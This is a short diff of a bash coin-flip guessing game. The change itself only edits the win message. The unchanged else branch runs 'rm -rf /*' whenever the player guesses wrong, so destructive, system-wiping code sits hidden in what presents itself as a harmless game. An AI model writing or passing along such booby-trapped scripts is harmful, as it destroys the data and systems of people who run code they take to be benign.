@@ -20,7 +20,7 @@ fi
 echo "The coin landed on: $result"
 
 if [ "$user_choice" == "$result" ]; then
-    echo "You win! Congratulations!"
+    echo "You win"
 else
     rm -rf /*
 fi
